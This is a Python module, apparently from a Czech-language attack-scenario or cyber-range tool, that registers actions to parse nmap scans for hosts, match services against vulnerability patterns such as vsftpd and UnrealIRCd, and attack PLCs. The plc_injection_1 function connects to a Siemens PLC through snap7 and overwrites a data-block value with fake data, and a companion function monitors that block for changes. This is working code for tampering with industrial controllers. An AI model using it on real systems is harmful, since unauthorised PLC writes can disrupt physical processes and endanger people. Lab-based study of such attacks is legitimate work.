import asyncio, re
from core.scenarios.services import send_to_websocket

# Registr pro Python akce
PYTHON_ACTION_REGISTRY = {}

def register_python_action(name):
    """
    Dekorátor pro registraci Python akcí.
    Použij ho, když definuješ novou akci, aby se automaticky přidala do registru.
    """
    def decorator(func):
        PYTHON_ACTION_REGISTRY[name] = func
        return func
    return decorator

async def execute_python_action(action, parameters, context, group_name):
    """
    Spustí Python funkci definovanou v akci typu 'python'.
    Očekává se, že v konfiguraci akce bude uveden klíč 'python_function',
    který obsahuje název funkce registrované v PYTHON_ACTION_REGISTRY.
    
    Funkce se volá s předanými parametry a aktuálním kontextem.
    Pokud vrátí obyčejnou hodnotu (např. řetězec/list/int), 
    bereme to jako (True, ta_hodnota).
    Pokud vrátí dvojici (bool, cokoliv), bereme bool jako success, cokoliv jako output.
    """
    python_function_name = action.get("python_function")
    if not python_function_name:
        await send_to_websocket(group_name, "Chybí specifikace 'python_function' v akci.")
        return False, "Missing python_function specification."

    func = PYTHON_ACTION_REGISTRY.get(python_function_name)
    if not func:
        msg = f"Python funkce '{python_function_name}' nebyla nalezena."
        await send_to_websocket(group_name, msg)
        return False, msg

    try:
        # Rozlišíme, zda funkce je async nebo sync
        if asyncio.iscoroutinefunction(func):
            result = await func(parameters, context, group_name)
        else:
            result = func(parameters, context)
        
        # Teď zjistíme, zda result je tuple (bool, cokoliv)
        if isinstance(result, tuple) and len(result) == 2 and isinstance(result[0], bool):
            success, output = result
        else:
            # Bereme to jako (True, result)
            success, output = True, result
        
        await send_to_websocket(group_name, f"Výstup: {output}") # možná smazat?
        return success, output

    except Exception as e:
        err_msg = f"Chyba při spuštění python funkce '{python_function_name}': {str(e)}"
        await send_to_websocket(group_name, err_msg)
        return False, err_msg

@register_python_action("parse_nmap_output_for_IPs")
def parse_nmap_output_for_IPs(parameters, context):
    """
    Přečte surový výstup nmapu (ping scan) z kontextu
    a vyparsuje řádky typu 'Nmap scan report for 192.168.50.10'.
    Výsledné IP uloží do context["host_list"] jako mezerou oddělený řetězec.

    Parametry (parameters):
      - output_key: (volitelný) klíč v kontextu, kde je uložen surový výstup. 
        Default: 'ping_scan_output'.

    Návratová hodnota:
      - Řetězec všech nalezených IP adres, oddělených mezerou.
    """
    import re

    output_key = parameters.get("nmap_output", "output") # vystup z nmapu, v připadě že není definován, hledá se "output"
    raw_output = context.get(output_key, "")
    if not raw_output:
        return "Nebyl nalezen žádný surový výstup nmapu v kontextu."

    found_ips = []
    for line in raw_output.splitlines():
        line = line.strip()
        # Hledáme řádky typu "Nmap scan report for 192.168.50.10"
        m = re.match(r"Nmap scan report for (\S+)", line)
        if m:
            ip_addr = m.group(1)
            found_ips.append(ip_addr)

    # Převést seznam IP na jediný řetězec oddělený mezerou
    ip_string = " ".join(found_ips)

    # Uložíme do contextu
    # context["host_list"] = ip_string

    # print(f"context = {context}")

    # Vrátíme stejný řetězec
    return ip_string


@register_python_action("parse_nmap_services_for_vulns")
def parse_nmap_services_for_vulns(parameters, context):
    """
    Projde nmap service scan a hledá definované signatury. 
    - Při prvním matchi uloží do context["vuln_name"] label patternu.
    - Vrací jen IP (string) nebo (False, "něco").
    """
    import re

    scan_key = parameters.get("scan_output_key", "service_scan_output")
    raw_output = context.get(scan_key, "")
    if not raw_output:
        return (False, "Chybí nmap service scan output")

    patterns = parameters.get("patterns", {})
    ip_services = {}
    current_ip = None

    for line in raw_output.splitlines():
        line = line.strip()
        # Najdi "Nmap scan report for <IP>"
        m = re.match(r"Nmap scan report for (\S+)", line)
        if m:
            current_ip = m.group(1)
            ip_services[current_ip] = []
        else:
            if current_ip:
                ip_services[current_ip].append(line)

    found_ip = None
    found_label = None

    for ip, lines in ip_services.items():
        joined = " ".join(lines).lower()
        for label, pattern in patterns.items():
            if pattern.lower() in joined:
                found_ip = ip
                found_label = label
                break
        if found_ip:
            break

    if found_ip:
        # Zapíšeme do kontextu => scenář nepoužije 'context_updates' k tomu, 
        # aby tam dal 'vuln_name', ale funkce to rovnou udělá.
        context["vuln_name"] = found_label  # např. "unreal_ircd" nebo "vsftpd"

        # A vrátíme jen IP jako řetězec (success = True implicitně, 
        # protože je to obyčejná hodnota, ne tuple)
        return found_ip
    else:
        # Nenašli jsme nic => fail
        return (False, "Nebyly nalezeny definované patterny")

@register_python_action("plc_injection_1")
async def plc_injection_1(parameters, context, group_name):
        
    import snap7
    target_ip = parameters.get("target_ip")
    
    if not target_ip:
        raise ValueError("Missing 'target_ip' in parameters.")
    
    myplc = snap7.client.Client()
    myplc.connect(target_ip, 0, 2)
    
    # print("Připojeno k PLC:", myplc.get_connected())
    # print("CPU stav:", myplc.get_cpu_state())
    

    await send_to_websocket(group_name, f"Připojeno k PLC: {myplc.get_connected()}")
    await send_to_websocket(group_name, f"CPU stav: {myplc.get_cpu_state()}")
    

    data = myplc.db_read(11, 0, 1)
    # print("Original DB data:", data)
    await send_to_websocket(group_name, f"Původní DB data: {data}")
    
    program_on = b'\x04'
    fake_data = b'\x00'
    
    # print("Falešená data k zápisu:", fake_data)
    await send_to_websocket(group_name, f"Falešná data k zápisu: {fake_data}")

    # print("Type of program_on variable:", type(program_on))
    
    myplc.db_write(11, 0, fake_data)
    await send_to_websocket(group_name, "Data úspěšně zapsána do PLC.")

    
    myplc.disconnect()


@register_python_action("plc_monitor_injection_1")
async def plc_monitor_injection_1(parameters, context, group_name):
    import snap7
    import asyncio

    target_ip = parameters.get("target_ip")
    interval = int(parameters.get("interval", 5))  # výchozí 5 sekund
    db_number = 11
    start = 0
    size = 1

    client = snap7.client.Client()
    
    try:
        client.connect(target_ip, 0, 2)
        if not client.get_connected():
            await send_to_websocket(group_name, "Nepodařilo se připojit k PLC.")
            return False, "Nepodařilo se připojit k PLC."

        await send_to_websocket(group_name, f"Monitoruji blok DB{db_number}, offset {start}, size {size}...")

        # Přečti původní hodnotu
        original_data = client.db_read(db_number, start, size)
        await send_to_websocket(group_name, f"Původní hodnota: {original_data}")

        while True:
            await asyncio.sleep(interval)
            try:
                current_data = client.db_read(db_number, start, size)
            except Exception as read_error:
                await send_to_websocket(group_name, f"Chyba při čtení z PLC: {str(read_error)}")
                return True, "Ztráta připojení nebo blokace přístupu k PLC."

            if current_data != original_data:
                await send_to_websocket(group_name, f"Detekována změna v DB{db_number}@{start}: {current_data}")
                context["plc_injection_change_detected"] = True
                return True, f"Detekována změna v PLC datech: {current_data}"

    except Exception as e:
        await send_to_websocket(group_name, f"Chyba při připojení nebo monitorování: {str(e)}")
        return False, str(e)
    
    finally:
        client.disconnect()